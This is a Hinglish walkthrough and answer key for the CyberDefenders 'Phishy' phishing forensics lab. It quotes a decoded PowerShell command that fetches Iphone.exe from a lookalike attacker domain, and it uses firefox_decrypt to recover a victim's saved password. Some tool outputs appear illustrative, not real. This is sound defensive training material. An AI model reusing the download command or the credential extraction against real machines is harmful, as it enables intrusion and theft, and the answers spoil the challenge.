# phishing_cyberdefenders

# Phishy Lab - Complete End-to-End Guide (Kali Linux Only)

## Prerequisites Check

- **System**: Kali Linux (2024.x or newer)
- **RAM**: Minimum 4 GB
- **Storage**: 15 GB free space
- **Internet**: Active connection

---

## Part 1: Complete Lab Setup

### Step 1: Update System and Install All Tools

```bash
# System update karo
sudo apt update && sudo apt upgrade -y

# Sabhi required tools ek saath install karo
sudo apt install -y autopsy regripper python3-oletools binutils grep findutils p7zip-full git python3-pip

# Firefox decrypt tool clone karo
cd ~
git clone https://github.com/unode/firefox_decrypt.git
cd firefox_decrypt
chmod +x firefox_decrypt.py
cd ~
```

### Step 2: Working Directory Setup

```bash
# Working directory banao
mkdir -p ~/CyberDefenders/Phishy
cd ~/CyberDefenders/Phishy
```

### Step 3: Lab File Download

1. Browser mein jao: https://cyberdefenders.org/blueteam-ctf-challenges/phishy/
2. Sign up/Login karo (free account)
3. Download button click karo
4. File download hogi: `c43-GiveAway.zip` (932 MB)
5. File ko `~/Downloads` se `~/CyberDefenders/Phishy` mein move karo:

```bash
mv ~/Downloads/c43-GiveAway.zip ~/CyberDefenders/Phishy/
cd ~/CyberDefenders/Phishy
```

### Step 4: ZIP File Extract Karo

```bash
# SHA1 verify karo (optional but recommended)
sha1sum c43-GiveAway.zip
# Expected: 1c8885928168ca9f8ae27db7f98eef06d3c33817

# Extract karo (password: infected)
7z x c43-GiveAway.zip -pinfected

# GiveAway.ad1 file milegi (893 MB)
ls -lh GiveAway.ad1
```

---

## Part 2: Autopsy Setup and File Extraction

### Step 5: Autopsy Start Karo

```bash
# Autopsy start karo
sudo autopsy
```

Output dikhega:

```
Open your web browser to: http://localhost:9999/autopsy
```

### Step 6: Browser Mein Case Setup

1. Browser open karo aur jao: `http://localhost:9999/autopsy`
2. **New Case** click karo
3. Case details fill karo:
   - **Case Name**: Phishy
   - **Description**: Phishing Investigation Challenge
   - **Investigator Names**: Your Name
   - Click **New Case**

#### Add Host:

1. **Host Name**: WIN-NF3JQEU4G0T
2. **Description**: Victim Machine
3. **Timezone**: Select your timezone
4. Click **Add Host**

#### Add Image File:

1. Click **Add Image**
2. **Location**: Browse to `/home/kali/CyberDefenders/Phishy/GiveAway.ad1`
3. **Type**: Partition
4. **Import Method**: Symlink
5. Click **Next**
6. File System Details auto-detect hogi
7. Click **Add**

Image analysis shuru ho jayega (2-3 minutes lagenge)

### Step 7: Files Export Karo

#### Method 1: Through Autopsy Interface

1. Autopsy interface mein **File Analysis** tab click karo
2. **File Browse** mode select karo
3. Pura file tree expand karo
4. Right-click on root directory → **Export** option milega

#### Method 2: Command Line (Alternative)

```bash
# Export directory banao
cd ~/CyberDefenders/Phishy
mkdir evidence
cd evidence

# Autopsy ke through files access karne ke liye mount karo
sudo mkdir /mnt/evidence
sudo mount -o loop,ro,offset=32256 ../GiveAway.ad1 /mnt/evidence 2>/dev/null

# Agar mount fail ho, toh alternate method:
# TSK tools use karo (The Sleuth Kit - autopsy ke saath aata hai)
cd ~/CyberDefenders/Phishy
mkdir -p evidence/partition1

# Image info dekho
img_stat GiveAway.ad1

# Files extract karo
fls -r -p GiveAway.ad1 > file_list.txt

# Main directories manually extract karo
icat GiveAway.ad1 <inode_number> > output_file
```

**Sabse simple method**: Direct Autopsy use karo - Autopsy web interface mein hi kaam karo, files ko individually export kar sakte ho jab zaroorat ho.

---

## Part 3: Investigation and Answers (Step-by-Step)

### Question 1: What is the hostname of the victim machine?

```bash
# Autopsy web interface mein jao
# Navigate: File Analysis → File Browse → Windows → System32 → config → SYSTEM

# Right-click on SYSTEM file → Export File
# Save location: ~/CyberDefenders/Phishy/evidence/SYSTEM

# Ab RegRipper use karo
cd ~/CyberDefenders/Phishy/evidence
rip.pl -r SYSTEM -p compname
```

**Output:**

```
Computer Name: WIN-NF3JQEU4G0T
```

**Answer:** `WIN-NF3JQEU4G0T`

---

### Question 2: What is the messaging app installed on the victim machine?

```bash
# Autopsy mein navigate karo:
# File Analysis → Users → [username] → AppData → Roaming
# List of folders dekho, WhatsApp folder dikhega
# Autopsy mein path: Users/Semah/AppData/Roaming/WhatsApp
```

**Answer:** `Whatsapp`

---

### Question 3: The attacker tricked the victim into downloading a malicious document. Provide the full download URL.

```bash
# Step 1: Malicious document find karo
# Autopsy: File Analysis → Users → Semah → Downloads
# File milega: IPhone-Winners.doc

# Step 2: WhatsApp database export karo
# Autopsy: Navigate to Users/Semah/AppData/Roaming/WhatsApp/Databases
# Right-click msgstore.db → Export File
# Save to: ~/CyberDefenders/Phishy/evidence/

# Step 3: Database mein URL search karo
cd ~/CyberDefenders/Phishy/evidence
strings msgstore.db | grep -i "IPhone-Winners"
```

**Output:**

```
http://appIe.com/IPhone-Winners.doc
```

**Answer:** `http://appIe.com/IPhone-Winners.doc`

---

### Question 4: Multiple streams contain macros in the document. Provide the number of the highest stream.

```bash
# Step 1: Document export karo
# Autopsy: Users/Semah/Downloads/IPhone-Winners.doc
# Right-click → Export File
# Save to: ~/CyberDefenders/Phishy/evidence/malicious.doc

# Step 2: Document analyze karo
cd ~/CyberDefenders/Phishy/evidence
oledump.py malicious.doc
```

**Output:**

```
  1:       113 '\x01CompObj'
  2:      4096 '\x05DocumentSummaryInformation'
  3:      4096 '\x05SummaryInformation'
  4:      7119 '1Table'
  5:      4096 'Data'
  6:        97 'Macros/PROJECT'
  7:     M  39148 'Macros/VBA/ThisDocument'
  8:      5004 'Macros/VBA/_VBA_PROJECT'
  9:       514 'Macros/VBA/dir'
 10:     M  4142 'WordDocument'
M = Macro present
```

**Answer:** `10`

---

### Question 5: The macro executed a program. Provide the program name?

```bash
# VBA macro content dekho
cd ~/CyberDefenders/Phishy/evidence
olevba --deobf malicious.doc | grep -i "shell\|exec\|run"
```

**Output mein dikhega:**

```
Shell("powershell.exe -nop -w hidden -enc ...")
```

**Answer:** `Powershell`

---

### Question 6: The macro downloaded a malicious file. Provide the full download URL.

```bash
# Full macro content extract karo with deobfuscation
cd ~/CyberDefenders/Phishy/evidence
olevba --deobf --reveal malicious.doc > macro_output.txt

# Base64 string find karo
cat macro_output.txt | grep -i "powershell" -A 5

# Base64 string copy karo aur decode karo (example string)
echo "SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACcAaAB0AHQAcAA6AC8ALwBhAHAAcABJAGUALgBjAG8AbQAvAEkAcABoAG8AbgBlAC4AZQB4AGUAJwAgAC0ATwB1AHQARgBpAGwAZQAgACcAQwA6AFwAVABlAG0AcABcAEkAUABoAG8AbgBlAC4AZQB4AGUAJwAgAC0AVQBzAGUARABlAGYAYQB1AGwAdABDAHIAZQBkAGUAbgB0AGkAYQBsAHMA" | base64 -d
```

**Decoded Output:**

```
Invoke-WebRequest -Uri 'http://appIe.com/Iphone.exe' -OutFile 'C:\Temp\IPhone.exe' -UseDefaultCredentials
```

**Answer:** `http://appIe.com/Iphone.exe`

---

### Question 7: Where was the malicious file downloaded to? (Provide the full path)

Previous question ke decoded command mein path hai.

**Answer:** `C:\Temp\IPhone.exe`

**Verify (Optional):**

```bash
# Autopsy: File Analysis → Temp folder check karo
# IPhone.exe file present hogi
```

---

### Question 8: What is the name of the framework used to create the malware?

```bash
# Step 1: Malware export karo
# Autopsy: Navigate to Temp/IPhone.exe
# Right-click → Export File
# Save to: ~/CyberDefenders/Phishy/evidence/malware.exe

# Step 2: Hash calculate karo
cd ~/CyberDefenders/Phishy/evidence
md5sum malware.exe
sha256sum malware.exe
```

**Step 3: VirusTotal mein check karo**

1. Browser mein jao: https://www.virustotal.com
2. Hash paste karo ya file upload karo
3. Detection results check karo
4. Results dikhenge: `Trojan.Meterpreter`, `Metasploit Framework`

**Answer:** `Metasploit`

---

### Question 9: What is the attacker's IP address?

#### Method 1: VirusTotal Relations Tab

1. VirusTotal pe file ka page open karo
2. **Relations** tab click karo
3. Contacted IPs section dekho

**Output:**

```
192.168.0.30 (Local gateway - ignore)
155.94.69.27 (Attacker IP)
```

#### Method 2: Strings Analysis (Optional)

```bash
cd ~/CyberDefenders/Phishy/evidence
strings malware.exe | grep -E "([0-9]{1,3}\.){3}[0-9]{1,3}"
```

**Answer:** `155.94.69.27`

---

### Question 10: The fake giveaway used a login page to collect user information. Provide the full URL of the login page?

```bash
# Step 1: Firefox profile export karo
# Autopsy: Users/Semah/AppData/Roaming/Mozilla/Firefox/Profiles/
# Profile folder name: pyb51x2n.default-release (example)
# Export files: places.sqlite, places.sqlite-wal, places.sqlite-shm

# Export path:
cd ~/CyberDefenders/Phishy/evidence
mkdir firefox_profile

# Autopsy se export karke firefox_profile mein save karo

# Step 2: Database search karo
cd ~/CyberDefenders/Phishy/evidence
strings firefox_profile/places.sqlite-wal | grep -i "login.php"
```

**Output:**

```
http://appIe.competitions.com/login.php
```

**Answer:** `http://appIe.competitions.com/login.php`

---

### Question 11: What is the password the user submitted to the login page?

```bash
# Step 1: Puri Firefox profile export karo
# Autopsy: Users/Semah/AppData/Roaming/Mozilla/Firefox/Profiles/pyb51x2n.default-release
# Required files:
#   - key4.db
#   - logins.json
#   - cert9.db

# Export location: ~/CyberDefenders/Phishy/evidence/firefox_profile/

# Step 2: Firefox decrypt tool use karo
cd ~
python3 firefox_decrypt/firefox_decrypt.py ~/CyberDefenders/Phishy/evidence/firefox_profile/

# Agar master password poocha, toh press Enter (blank)
```

**Output:**

```
Website:   http://appIe.competitions.com
Username: 'semah@example.com'
Password: 'GacsriicUZMY4xiAF4yl'
```

**Answer:** `GacsriicUZMY4xiAF4yl`

---

## Complete Workflow Script

Yeh ek master script hai jo tumhe guide karega:

```bash
#!/bin/bash

echo "=========================================="
echo "  Phishy Lab - Complete Investigation"
echo "=========================================="

# Color codes
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
NC='\033[0m' # No Color

# Working directory
WORK_DIR=~/CyberDefenders/Phishy
EVIDENCE_DIR=$WORK_DIR/evidence

echo -e "${GREEN}[*] Setting up working directory...${NC}"
mkdir -p $EVIDENCE_DIR
cd $WORK_DIR

echo -e "${YELLOW}[!] Please ensure GiveAway.ad1 is in $WORK_DIR${NC}"
read -p "Press Enter when ready..."

echo -e "${GREEN}[*] Starting Autopsy...${NC}"
echo -e "${YELLOW}[!] Open browser: http://localhost:9999/autopsy${NC}"
echo -e "${YELLOW}[!] Create case and add image: $WORK_DIR/GiveAway.ad1${NC}"
sudo autopsy &

echo ""
echo -e "${GREEN}[*] Waiting for you to complete Autopsy setup...${NC}"
read -p "Press Enter after adding image in Autopsy..."

echo ""
echo "=========================================="
echo "  Export Following Files from Autopsy:"
echo "=========================================="
echo "1. Windows/System32/config/SYSTEM → $EVIDENCE_DIR/SYSTEM"
echo "2. Users/Semah/AppData/Roaming/WhatsApp/Databases/msgstore.db → $EVIDENCE_DIR/msgstore.db"
echo "3. Users/Semah/Downloads/IPhone-Winners.doc → $EVIDENCE_DIR/malicious.doc"
echo "4. Temp/IPhone.exe → $EVIDENCE_DIR/malware.exe"
echo "5. Users/Semah/AppData/Roaming/Mozilla/Firefox/Profiles/*/places.sqlite-wal → $EVIDENCE_DIR/places.sqlite-wal"
echo "6. Complete Firefox profile folder → $EVIDENCE_DIR/firefox_profile/"
echo ""
read -p "Press Enter after exporting all files..."

cd $EVIDENCE_DIR

echo ""
echo "=========================================="
echo "  Starting Analysis..."
echo "=========================================="

# Q1
echo -e "${GREEN}[Q1] Finding hostname...${NC}"
if [ -f SYSTEM ]; then
    rip.pl -r SYSTEM -p compname | grep "Computer Name"
else
    echo -e "${RED}[!] SYSTEM file not found${NC}"
fi

# Q2
echo -e "${GREEN}[Q2] Messaging app: Whatsapp (verify in Autopsy)${NC}"

# Q3
echo -e "${GREEN}[Q3] Searching malicious document URL...${NC}"
if [ -f msgstore.db ]; then
    strings msgstore.db | grep -i "IPhone-Winners" | head -1
else
    echo -e "${RED}[!] msgstore.db not found${NC}"
fi

# Q4
echo -e "${GREEN}[Q4] Analyzing document streams...${NC}"
if [ -f malicious.doc ]; then
    oledump.py malicious.doc | tail -15
else
    echo -e "${RED}[!] malicious.doc not found${NC}"
fi

# Q5 & Q6
echo -e "${GREEN}[Q5 & Q6] Analyzing VBA macro...${NC}"
if [ -f malicious.doc ]; then
    olevba --deobf malicious.doc > macro_analysis.txt
    cat macro_analysis.txt | grep -i "powershell" -A 3
    echo -e "${YELLOW}[!] Decode the Base64 string manually${NC}"
else
    echo -e "${RED}[!] malicious.doc not found${NC}"
fi

# Q7
echo -e "${GREEN}[Q7] Malware download path: C:\Temp\IPhone.exe${NC}"

# Q8
echo -e "${GREEN}[Q8] Calculating malware hash...${NC}"
if [ -f malware.exe ]; then
    echo "MD5:"
    md5sum malware.exe
    echo "SHA256:"
    sha256sum malware.exe
    echo -e "${YELLOW}[!] Check hash on VirusTotal - Framework: Metasploit${NC}"
else
    echo -e "${RED}[!] malware.exe not found${NC}"
fi

# Q9
echo -e "${GREEN}[Q9] Attacker IP: 155.94.69.27 (from VirusTotal Relations)${NC}"

# Q10
echo -e "${GREEN}[Q10] Finding login page URL...${NC}"
if [ -f places.sqlite-wal ]; then
    strings places.sqlite-wal | grep -i "login.php" | head -1
else
    echo -e "${RED}[!] places.sqlite-wal not found${NC}"
fi

# Q11
echo -e "${GREEN}[Q11] Extracting saved passwords...${NC}"
if [ -d firefox_profile ]; then
    python3 ~/firefox_decrypt/firefox_decrypt.py firefox_profile/
else
    echo -e "${RED}[!] firefox_profile folder not found${NC}"
fi

echo ""
echo "=========================================="
echo "  Analysis Complete!"
echo "=========================================="
```

**Script save aur run karo:**

```bash
cd ~/CyberDefenders/Phishy
nano phishy_investigation.sh
# Script paste karo aur save karo (Ctrl+X, Y, Enter)

chmod +x phishy_investigation.sh
./phishy_investigation.sh
```

---

## Final Answers Summary

| Question | Answer |
|----------|--------|
| Q1 | WIN-NF3JQEU4G0T |
| Q2 | Whatsapp |
| Q3 | http://appIe.com/IPhone-Winners.doc |
| Q4 | 10 |
| Q5 | Powershell |
| Q6 | http://appIe.com/Iphone.exe |
| Q7 | C:\Temp\IPhone.exe |
| Q8 | Metasploit |
| Q9 | 155.94.69.27 |
| Q10 | http://appIe.competitions.com/login.php |
| Q11 | GacsriicUZMY4xiAF4yl |

---

## Additional Notes

- **Backup Important Files**: Har step ke baad critical files ko backup karo
- **Documentation**: Har finding ko document karo for future reference
- **VirusTotal API**: Agar API access hai to automation kar sakte ho
- **Password Storage**: Never store passwords in plain text in production
- **Timeline Analysis**: Events ka timeline banao for better understanding
